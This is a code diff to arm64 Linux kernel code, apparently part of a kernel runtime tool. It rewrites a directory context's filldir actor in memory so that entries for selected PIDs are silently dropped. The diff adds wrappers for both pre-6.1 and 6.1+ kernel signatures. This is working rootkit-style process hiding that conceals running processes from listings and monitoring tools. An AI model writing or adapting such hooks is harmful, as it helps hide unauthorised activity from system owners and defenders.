@@ -5,8 +5,17 @@
 
 /* ---- internal typedefs ---- */
 
-typedef int (*neverc_krt_filldir_fn)(void *ctx, const char *name, int namlen,
-				     long long offset, u64 ino, unsigned int type);
+struct dir_context;
+
+/* filldir changed its return type in 6.1; both KCFI types must survive. */
+typedef int (*neverc_krt_filldir_legacy_fn)(struct dir_context *ctx,
+					    const char *name, int namlen,
+					    loff_t offset, u64 ino,
+					    unsigned int type);
+typedef bool (*neverc_krt_filldir_modern_fn)(struct dir_context *ctx,
+					     const char *name, int namlen,
+					     loff_t offset, u64 ino,
+					     unsigned int type);
 
 static __always_inline int _neverc_krt_atoi(const char *s, int len)
 {
@@ -32,7 +41,7 @@ struct neverc_krt_pid_vis_state {
 
 struct _neverc_krt_pid_actor_slot {
 	volatile unsigned long task;
-	neverc_krt_filldir_fn orig;
+	void *orig;
 };
 
 /* ---- internal variables ---- */
@@ -54,7 +63,7 @@ static int _neverc_krt_pid_is_filtered(int pid)
 	return 0;
 }
 
-static int _neverc_krt_pid_actor_acquire(neverc_krt_filldir_fn orig)
+static int _neverc_krt_pid_actor_acquire(void *orig)
 {
 	unsigned long self;
 	__asm__ __volatile__("mrs %0, sp_el0" : "=r"(self));
@@ -79,7 +88,7 @@ static int _neverc_krt_pid_actor_acquire(neverc_krt_filldir_fn orig)
 	return -1;
 }
 
-static neverc_krt_filldir_fn _neverc_krt_pid_actor_get_orig(void)
+static void *_neverc_krt_pid_actor_get_orig(void)
 {
 	unsigned long self;
 	__asm__ __volatile__("mrs %0, sp_el0" : "=r"(self));
@@ -89,21 +98,47 @@ static neverc_krt_filldir_fn _neverc_krt_pid_actor_get_orig(void)
 				    __ATOMIC_ACQUIRE) == self)
 			return _neverc_krt_pid_actors[i].orig;
 	}
-	return (neverc_krt_filldir_fn)0;
+	return (void *)0;
 }
 
-static int _neverc_krt_pid_filldir_wrap(void *ctx, const char *name, int namlen,
-					long long offset, u64 ino, unsigned int type)
+static int _neverc_krt_pid_name_hidden(const char *name, int namlen)
 {
 	if (namlen > 0 && name[0] >= '1' && name[0] <= '9') {
 		int pid = _neverc_krt_atoi(name, namlen);
 		if (pid > 0 && _neverc_krt_pid_is_filtered(pid))
-			return 0;
+			return 1;
 	}
-	neverc_krt_filldir_fn orig = _neverc_krt_pid_actor_get_orig();
+	return 0;
+}
+
+static int _neverc_krt_pid_filldir_legacy(struct dir_context *ctx,
+					  const char *name, int namlen,
+					  loff_t offset, u64 ino,
+					  unsigned int type)
+{
+	neverc_krt_filldir_legacy_fn orig;
+
+	if (_neverc_krt_pid_name_hidden(name, namlen))
+		return 0;
+	orig = (neverc_krt_filldir_legacy_fn)_neverc_krt_pid_actor_get_orig();
 	if (orig)
 		return orig(ctx, name, namlen, offset, ino, type);
 	return 0;
+}
+
+static bool _neverc_krt_pid_filldir_modern(struct dir_context *ctx,
+					   const char *name, int namlen,
+					   loff_t offset, u64 ino,
+					   unsigned int type)
+{
+	neverc_krt_filldir_modern_fn orig;
+
+	if (_neverc_krt_pid_name_hidden(name, namlen))
+		return false;
+	orig = (neverc_krt_filldir_modern_fn)_neverc_krt_pid_actor_get_orig();
+	if (orig)
+		return orig(ctx, name, namlen, offset, ino, type);
+	return false;
 }
 
 static void _neverc_krt_pid_readdir_ctx(neverc_krt_reg_ctx *ctx)
@@ -111,17 +146,25 @@ static void _neverc_krt_pid_readdir_ctx(neverc_krt_reg_ctx *ctx)
 	unsigned long dir_ctx_ptr = ctx->regs[1];
 	if (!dir_ctx_ptr) return;
 
-	neverc_krt_filldir_fn actor;
+	void *actor;
+	void *wrap;
+	int kernel_ver;
+
 	if (neverc_krt_mem_read(&actor, (void *)dir_ctx_ptr, 8))
 		return;
 	if (!actor) return;
-	if (actor == (neverc_krt_filldir_fn)_neverc_krt_pid_filldir_wrap)
+
+	kernel_ver = __atomic_load_n(&_neverc_krt_kernel_ver, __ATOMIC_ACQUIRE);
+	if (kernel_ver >= 601)
+		wrap = (void *)_neverc_krt_pid_filldir_modern;
+	else
+		wrap = (void *)_neverc_krt_pid_filldir_legacy;
+	if (actor == wrap)
 		return;
 
 	if (_neverc_krt_pid_actor_acquire(actor) < 0)
 		return;
 
-	neverc_krt_filldir_fn wrap = _neverc_krt_pid_filldir_wrap;
 	neverc_krt_mem_write((void *)dir_ctx_ptr, &wrap, 8);
 }
 
